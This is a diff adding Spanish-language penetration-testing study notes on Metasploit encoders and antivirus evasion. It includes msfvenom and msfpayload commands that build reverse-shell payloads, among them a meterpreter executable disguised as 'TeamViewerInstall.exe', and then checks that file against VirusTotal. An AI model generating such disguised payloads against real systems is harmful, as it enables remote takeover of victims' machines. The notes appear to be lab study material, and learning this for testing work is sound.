@@ -294,6 +294,56 @@ windows/x64/powershell/$	Interactive PowerShell sessions + varieties above
 windows/x64/vncinject/$	VNC Server (Reflective Injection) + varieties above
 
 
+## ENCODERS
+
+Los encoders tienen la asintencia con la compatibilidad de los payloads con diferente proceso de arquitectura mientras ayuda a una evasion de antivirus. Tienen el rol de cambiar el payload y ejecutarlo en diferentes sistemas operativos y arquitecturas. Como:
+
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/f17dad7c-c39b-4f46-a1b6-e140fda51071)
+
+Ellos necesitan remover como caracteres malos del payload. No solo codifica tambien hace que el formato que utiliza y ayuda a que el AV no detecte. Sin embargo el uso de encoder no hace que estrictamente evada el anti virus, los IPS/IDS manofactura para improvisar como funciona la protección de software con firmas en malware y virus.
+
+SGN es uno de los encoders esquemas mas utilizados hoy en dia porque es muy difícil de detectar estos payloads codifican a un mecanismo universal indetectable. Sin embargo estas metodologias exploran evadir protección de los sistemas.
+
+### SELECCIONAR UN ENCODER
+
+msfpayload y msfencode las dos localizadas en /usr/share/framework2/
+
+Si nosotros queremos crear nuestro propio payload utilizaremos "msfpayload" pero cuando queremos codificar para la arquitectura del OS utilizaremos "msfencode". 
+
+```
+msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
+```
+
+Hoy en dia con la misma herramienta de "msfvenos" se puede hacer todo de una:
+```
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
+```
+### GENERAR UN PAYLOAD CODIFICADO
+
+```
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+```
+Si queremos un encoder existente simplemente usaremos el comando
+```
+show encoders
+```
+con el "msfconsole" para elegir uno "exploit module + payload"
+```
+set payload 15
+show encoders
+```
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
+```
+Esto generar un .exe en formato llamado "teamviewerinstall" en la arquitectura "x86" en la plataforma de windows, y por debajo un "reverse_tcp" shell
+
+Si lo pasamos por virus total 
+![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/2154e0a8-66f3-4aa6-a640-2b6112fcceaa)
+
+Como vemos no hay una evasión de antivirus, hay muchos productos que selecciona como virus, otra herramienta muy importante se llama "msf-virustotal" utilizariamos nuestra "api-key" para analizar nuestros payloads, sin embargo requiere un registro en virus total.
+```
+msf-virustotal -k <API key> -f TeamViewerInstall.exe
+```
 
 
 
